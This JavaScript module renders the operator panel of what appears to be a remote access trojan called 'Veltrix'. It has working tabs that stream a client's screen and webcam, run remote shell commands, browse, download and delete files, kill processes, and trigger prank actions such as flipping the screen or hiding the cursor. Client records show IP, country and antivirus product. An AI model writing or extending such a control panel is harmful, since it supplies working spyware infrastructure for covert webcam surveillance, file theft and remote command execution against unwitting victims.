import { api } from "./api.js";
const CONTROL_TABS = [
    { id: "screen", label: "Live Screen" },
    { id: "camera", label: "Live Camera" },
    { id: "shell", label: "Shell" },
    { id: "files", label: "Files" },
    { id: "processes", label: "Processes" },
    { id: "system", label: "System" },
    { id: "fun", label: "Fun" },
    { id: "info", label: "Info" },
];
export function renderAdminControl(detail) {
    const c = detail.client;
    return `
    <div class="hc-control-layout">
      <aside class="hc-control-sidebar">
        <button class="hc-back-btn" id="ctrl-back">← ${c.name}</button>
        ${CONTROL_TABS.map(t => `<button class="hc-control-nav ${t.id === "screen" ? "active" : ""}" data-tab="${t.id}">${t.label}</button>`).join("")}
      </aside>
      <div class="hc-control-main">
        <div class="hc-control-header">
          <div>
            <div class="hc-muted" style="font-size:11px;text-transform:uppercase;letter-spacing:0.06em">REMOTE CONTROL</div>
            <h1 style="margin:0" id="ctrl-title">Live Screen</h1>
          </div>
          <div style="display:flex;gap:12px;align-items:center">
            <span class="hc-muted" style="font-size:12px">CPU —</span>
            <span class="hc-muted" style="font-size:12px">RAM —</span>
            <span class="hc-badge ${c.status}">${c.status}</span>
            <button class="hc-connect-btn hc-danger-btn" id="ctrl-end">End session</button>
          </div>
        </div>
        <div id="ctrl-content"></div>
      </div>
    </div>`;
}
export function bindAdminControl(view, detail, onBack) {
    const c = detail.client;
    let ctrlTab = "screen";
    let shellHistory = (detail.commandHistory || []).map(h => ({ cmd: h.command, out: h.result }));
    let screenInterval = null;
    let camInterval = null;
    let screenStreaming = false;
    let camStreaming = false;
    let screenFps = 2;
    let screenQuality = 60;
    let camFps = 2;
    let camQuality = 60;
    let screenFrameCount = 0;
    let camFrameCount = 0;
    let filePath = "C:\\Users\\" + (c.user || "");
    let fileList = detail.files || [];
    function cleanup() {
        if (screenInterval) clearInterval(screenInterval);
        if (camInterval) clearInterval(camInterval);
    }
    view.querySelector("#ctrl-back").addEventListener("click", () => { cleanup(); onBack(); });
    view.querySelector("#ctrl-end").addEventListener("click", () => { cleanup(); onBack(); });
    view.querySelectorAll(".hc-control-nav").forEach(btn => {
        btn.addEventListener("click", () => {
            ctrlTab = btn.dataset["tab"];
            view.querySelectorAll(".hc-control-nav").forEach(b => b.classList.remove("active"));
            btn.classList.add("active");
            view.querySelector("#ctrl-title").textContent = CONTROL_TABS.find(t => t.id === ctrlTab)?.label || "";
            renderContent();
        });
    });
    function renderContent() {
        const el = view.querySelector("#ctrl-content");
        if (ctrlTab === "screen") {
            el.innerHTML = `
        <div class="hc-viewer-toolbar">
          <button class="hc-toolbar-btn ${screenStreaming ? "hc-active-btn" : ""}" id="screen-toggle">${screenStreaming ? "Stop" : "Start"}</button>
          <button class="hc-toolbar-btn">Mouse</button>
          <button class="hc-toolbar-btn">Keyboard</button>
          <button class="hc-toolbar-btn">Draw</button>
          <button class="hc-toolbar-btn">Clear</button>
          <button class="hc-toolbar-btn">Lock Input</button>
          <button class="hc-toolbar-btn">Fullscreen</button>
          <div style="flex:1"></div>
          <span id="screen-live-info" style="display:${screenStreaming ? "flex" : "none"};align-items:center;gap:8px;font-size:12px">
            <span class="hc-live-badge">LIVE</span>
            <span class="hc-muted"><span id="screen-fc">${screenFrameCount}</span> frames</span>
            <span class="hc-muted">TCP</span>
            <span class="hc-muted">Relay ON</span>
          </span>
        </div>
        <div class="hc-viewer-frame hc-viewer-large" id="screen-viewer">
          <div class="hc-viewer-empty">
            <div class="hc-muted" style="font-size:14px;font-weight:500;margin-bottom:4px">Screen Viewer</div>
            <div class="hc-muted">Click Start to begin screen capture</div>
          </div>
        </div>
        <div class="hc-viewer-sliders" style="margin-top:12px">
          <div class="hc-slider-group">
            <label class="hc-slider-label">FPS <span class="hc-mono" id="screen-fps-val">${screenFps}</span></label>
            <input type="range" min="1" max="10" value="${screenFps}" class="hc-range" id="screen-fps" />
          </div>
          <div class="hc-slider-group">
            <label class="hc-slider-label">Quality <span class="hc-mono" id="screen-q-val">${screenQuality}%</span></label>
            <input type="range" min="10" max="100" step="5" value="${screenQuality}" class="hc-range" id="screen-quality" />
          </div>
        </div>`;
            el.querySelector("#screen-fps").addEventListener("input", (e) => {
                screenFps = Number(e.target.value);
                el.querySelector("#screen-fps-val").textContent = String(screenFps);
                if (screenStreaming && screenInterval) { clearInterval(screenInterval); screenInterval = setInterval(captureScreen, 1000 / screenFps); }
            });
            el.querySelector("#screen-quality").addEventListener("input", (e) => {
                screenQuality = Number(e.target.value);
                el.querySelector("#screen-q-val").textContent = screenQuality + "%";
            });
            el.querySelector("#screen-toggle").addEventListener("click", () => {
                if (screenStreaming) { if (screenInterval) clearInterval(screenInterval); screenInterval = null; screenStreaming = false; }
                else { screenStreaming = true; captureScreen(); screenInterval = setInterval(captureScreen, 1000 / screenFps); }
                renderContent();
            });
            return;
        }
        if (ctrlTab === "camera") {
            el.innerHTML = `
        <div class="hc-viewer-toolbar">
          <button class="hc-toolbar-btn ${camStreaming ? "hc-active-btn" : ""}" id="cam-toggle">${camStreaming ? "Stop" : "Start"}</button>
          <button class="hc-toolbar-btn" id="cam-snap">Snapshot</button>
          <div style="flex:1"></div>
          <span id="cam-live-info" style="display:${camStreaming ? "flex" : "none"};align-items:center;gap:8px;font-size:12px">
            <span class="hc-live-badge">LIVE</span>
            <span class="hc-muted"><span id="cam-fc">${camFrameCount}</span> frames</span>
          </span>
        </div>
        <div class="hc-viewer-frame hc-viewer-large" id="cam-viewer">
          <div class="hc-viewer-empty">
            <div class="hc-muted" style="font-size:14px;font-weight:500;margin-bottom:4px">Camera Viewer</div>
            <div class="hc-muted">Click Start to begin camera capture</div>
          </div>
        </div>
        <div class="hc-viewer-sliders" style="margin-top:12px">
          <div class="hc-slider-group">
            <label class="hc-slider-label">FPS <span class="hc-mono" id="cam-fps-val">${camFps}</span></label>
            <input type="range" min="1" max="10" value="${camFps}" class="hc-range" id="cam-fps" />
          </div>
          <div class="hc-slider-group">
            <label class="hc-slider-label">Quality <span class="hc-mono" id="cam-q-val">${camQuality}%</span></label>
            <input type="range" min="10" max="100" step="5" value="${camQuality}" class="hc-range" id="cam-quality" />
          </div>
        </div>`;
            el.querySelector("#cam-fps").addEventListener("input", (e) => {
                camFps = Number(e.target.value);
                el.querySelector("#cam-fps-val").textContent = String(camFps);
                if (camStreaming && camInterval) { clearInterval(camInterval); camInterval = setInterval(captureCamera, 1000 / camFps); }
            });
            el.querySelector("#cam-quality").addEventListener("input", (e) => {
                camQuality = Number(e.target.value);
                el.querySelector("#cam-q-val").textContent = camQuality + "%";
            });
            el.querySelector("#cam-toggle").addEventListener("click", () => {
                if (camStreaming) { if (camInterval) clearInterval(camInterval); camInterval = null; camStreaming = false; }
                else { camStreaming = true; captureCamera(); camInterval = setInterval(captureCamera, 1000 / camFps); }
                renderContent();
            });
            el.querySelector("#cam-snap").addEventListener("click", () => { if (!camStreaming) captureCamera(); });
            return;
        }
        if (ctrlTab === "shell") {
            el.innerHTML = `
        <div class="hc-card">
          <h3 class="hc-section-title">Remote Shell</h3>
          <div class="hc-shell-output" id="shell-output">
            ${shellHistory.length === 0 ? '<div class="hc-muted">No commands yet. Type below to execute.</div>' :
                shellHistory.map(h => `<div class="hc-shell-entry"><div class="hc-shell-cmd">&gt; ${esc(h.cmd)}</div><pre class="hc-shell-result">${esc(h.out)}</pre></div>`).join("")}
          </div>
          <div class="hc-shell-input-row">
            <span class="hc-muted">&gt;</span>
            <input id="shell-input" placeholder="Enter command..." class="hc-shell-input" />
            <button class="hc-connect-btn" id="shell-run">Run</button>
          </div>
        </div>`;
            const input = el.querySelector("#shell-input");
            const run = async () => {
                const cmd = input.value.trim();
                if (!cmd) return;
                input.value = "";
                try { const res = await api.sendCommand(c.id, "shell", cmd); shellHistory.push({ cmd, out: res.result }); }
                catch (e) { shellHistory.push({ cmd, out: `Error: ${e instanceof Error ? e.message : "Failed"}` }); }
                renderContent();
                const out = el.querySelector("#shell-output");
                if (out) out.scrollTop = out.scrollHeight;
            };
            input.addEventListener("keydown", (e) => { if (e.key === "Enter") run(); });
            el.querySelector("#shell-run").addEventListener("click", run);
            return;
        }
        if (ctrlTab === "files") {
            el.innerHTML = `
        <div class="hc-card">
          <h3 class="hc-section-title">File Explorer</h3>
          <div class="hc-file-toolbar">
            <button class="hc-mini-btn" id="file-up">Up</button>
            <input class="hc-file-path-input" id="file-path-input" value="${esc(filePath)}" />
            <button class="hc-mini-btn" id="file-go">Go</button>
            <button class="hc-mini-btn" id="file-refresh">Refresh</button>
          </div>
          <div class="hc-file-path-display hc-mono hc-muted">${esc(filePath)}</div>
          <div class="hc-file-list" id="file-list">
            ${fileList.map((f) => `
              <div class="hc-file-row" data-name="${esc(f.name)}" data-type="${f.type || f.kind || "file"}">
                <span class="hc-file-icon">${(f.type === "folder" || f.kind === "folder") ? "[D]" : "[F]"}</span>
                <span class="hc-file-name">${esc(f.name)}</span>
                <span class="hc-muted hc-file-size">${formatSize(f.size)}</span>
                <div class="hc-file-actions">
                  ${(f.type === "folder" || f.kind === "folder") ? `<button class="hc-mini-btn file-open-btn" data-name="${esc(f.name)}">Open</button>` : `<button class="hc-mini-btn file-dl-btn" data-name="${esc(f.name)}">Download</button>`}
                  <button class="hc-mini-btn hc-danger-btn">Delete</button>
                </div>
              </div>`).join("")}
            ${fileList.length === 0 ? '<div class="hc-muted" style="padding:12px">Empty directory</div>' : ""}
          </div>
        </div>`;
            async function browseDir(path) {
                filePath = path;
                try { const res = await api.sendCommand(c.id, "ls", `ls ${path}`); if (res.result?.startsWith?.("FILES:")) { fileList = JSON.parse(res.result.slice(6)); } }
                catch { fileList = detail.files || []; }
                renderContent();
            }
            el.querySelector("#file-up").addEventListener("click", () => {
                const parts = filePath.replace(/[\\/]+$/, "").split(/[\\/]/);
                if (parts.length > 1) { parts.pop(); browseDir(parts.join("\\") || "C:\\"); }
            });
            el.querySelector("#file-go").addEventListener("click", () => browseDir(el.querySelector("#file-path-input").value));
            el.querySelector("#file-refresh").addEventListener("click", () => browseDir(filePath));
            el.querySelector("#file-path-input").addEventListener("keydown", (e) => { if (e.key === "Enter") browseDir(e.target.value); });
            el.querySelectorAll(".file-open-btn").forEach(btn => { btn.addEventListener("click", () => browseDir(`${filePath}\\${btn.dataset["name"]}`)); });
            el.querySelectorAll(".file-dl-btn").forEach(btn => { btn.addEventListener("click", () => api.sendCommand(c.id, "download", `download ${filePath}\\${btn.dataset["name"]}`)); });
            el.querySelectorAll(".hc-file-row").forEach(row => { row.addEventListener("dblclick", () => { if (row.dataset["type"] === "folder") browseDir(`${filePath}\\${row.dataset["name"]}`); }); });
            return;
        }
        if (ctrlTab === "processes") {
            const procs = detail.processes || [];
            el.innerHTML = `
        <div class="hc-card">
          <h3 class="hc-section-title">Process Manager</h3>
          <input class="hc-search" id="proc-search" placeholder="Search processes..." style="margin-bottom:8px" />
          <table class="hc-table">
            <thead><tr><th>PID</th><th>Name</th><th>CPU</th><th>Memory</th><th>Status</th><th></th></tr></thead>
            <tbody id="proc-tbody">
              ${procs.map(p => `<tr data-search="${p.name.toLowerCase()}">
                <td class="hc-mono">${p.pid}</td>
                <td>${p.name}</td>
                <td>${p.cpu}</td>
                <td>${p.mem}</td>
                <td><span class="hc-badge ${p.status === "running" ? "online" : "idle"}">${p.status}</span></td>
                <td><button class="hc-mini-btn hc-danger-btn">Kill</button></td>
              </tr>`).join("")}
            </tbody>
          </table>
        </div>`;
            el.querySelector("#proc-search").addEventListener("input", (e) => {
                const q = e.target.value.toLowerCase();
                el.querySelectorAll("#proc-tbody tr").forEach(row => { row.style.display = (row.dataset["search"] || "").includes(q) ? "" : "none"; });
            });
            return;
        }
        if (ctrlTab === "system") {
            el.innerHTML = `
        <div class="hc-two-col">
          <div class="hc-card">
            <h3 class="hc-section-title">Hardware</h3>
            <div class="hc-info-row"><span>CPU</span><span>${c.cpu}</span></div>
            <div class="hc-info-row"><span>RAM</span><span>${c.ram}</span></div>
            <div class="hc-info-row"><span>GPU</span><span>${c.gpu}</span></div>
            <div class="hc-info-row"><span>Uptime</span><span>${c.uptime}</span></div>
          </div>
          <div class="hc-card">
            <h3 class="hc-section-title">Network and Security</h3>
            <div class="hc-info-row"><span>IP</span><span class="hc-mono">${c.ip}</span></div>
            <div class="hc-info-row"><span>Country</span><span>${c.country}</span></div>
            <div class="hc-info-row"><span>Speed</span><span>${c.netSpeed}</span></div>
            <div class="hc-info-row"><span>AV</span><span>${c.av}</span></div>
            <div class="hc-info-row"><span>Installed</span><span>${c.installed}</span></div>
          </div>
        </div>`;
            return;
        }
        if (ctrlTab === "fun") {
            const cmds = [
                { cmd: "msgbox Hello!", label: "Message Box" },
                { cmd: "speak Hello from Veltrix", label: "Text to Speech" },
                { cmd: "wallpaper", label: "Change Wallpaper" },
                { cmd: "beep", label: "Beep" },
                { cmd: "flip_screen", label: "Flip Screen" },
                { cmd: "open_url https://example.com", label: "Open URL" },
                { cmd: "cd_tray", label: "CD Tray" },
                { cmd: "cursor_hide", label: "Hide Cursor" },
            ];
            el.innerHTML = `
        <div class="hc-card">
          <h3 class="hc-section-title">Fun Commands</h3>
          <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px">
            ${cmds.map(f => `<button class="hc-connect-btn fun-cmd-btn" data-cmd="${esc(f.cmd)}" style="padding:12px 8px;font-size:12px">${f.label}</button>`).join("")}
          </div>
        </div>`;
            el.querySelectorAll(".fun-cmd-btn").forEach(btn => {
                btn.addEventListener("click", () => api.sendCommand(c.id, btn.dataset["cmd"]));
            });
            return;
        }
        if (ctrlTab === "info") {
            el.innerHTML = `
        <div class="hc-card">
          <h3 class="hc-section-title">Client Information</h3>
          <div class="hc-info-row"><span>Client ID</span><span class="hc-mono">${c.id}</span></div>
          <div class="hc-info-row"><span>Hostname</span><span>${c.name}</span></div>
          <div class="hc-info-row"><span>Username</span><span>${c.user}</span></div>
          <div class="hc-info-row"><span>OS</span><span>${c.os}</span></div>
          <div class="hc-info-row"><span>IP</span><span class="hc-mono">${c.ip}</span></div>
          <div class="hc-info-row"><span>Country</span><span>${c.country}</span></div>
          <div class="hc-info-row"><span>Status</span><span class="hc-badge ${c.status}">${c.status}</span></div>
          <div class="hc-info-row"><span>Last Seen</span><span>${c.lastSeen}</span></div>
          <div class="hc-info-row"><span>Installed</span><span>${c.installed}</span></div>
        </div>`;
            return;
        }
    }
    async function captureScreen() {
        try {
            const res = await api.sendCommand(c.id, "screenshot", `screenshot ${screenQuality}`);
            if (res.result?.startsWith?.("SCREEN:")) {
                screenFrameCount++;
                const viewer = view.querySelector("#screen-viewer");
                if (viewer) viewer.innerHTML = `<img src="data:image/jpeg;base64,${res.result.slice(7)}" alt="Screen" class="hc-viewer-img" />`;
                const fc = view.querySelector("#screen-fc");
                if (fc) fc.textContent = String(screenFrameCount);
                const info = view.querySelector("#screen-live-info");
                if (info) info.style.display = "flex";
            }
        } catch {}
    }
    async function captureCamera() {
        try {
            const res = await api.sendCommand(c.id, "camera", `camera ${camQuality}`);
            if (res.result?.startsWith?.("CAMERA:")) {
                camFrameCount++;
                const viewer = view.querySelector("#cam-viewer");
                if (viewer) viewer.innerHTML = `<img src="data:image/jpeg;base64,${res.result.slice(7)}" alt="Camera" class="hc-viewer-img" />`;
                const fc = view.querySelector("#cam-fc");
                if (fc) fc.textContent = String(camFrameCount);
                const info = view.querySelector("#cam-live-info");
                if (info) info.style.display = "flex";
            }
        } catch {}
    }
    renderContent();
}
function esc(s) {
    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}
function formatSize(bytes) {
    if (typeof bytes === "string") return bytes;
    if (bytes === 0) return "-";
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
    if (bytes < 1024 * 1024 * 1024) return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
    return `${(bytes / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}
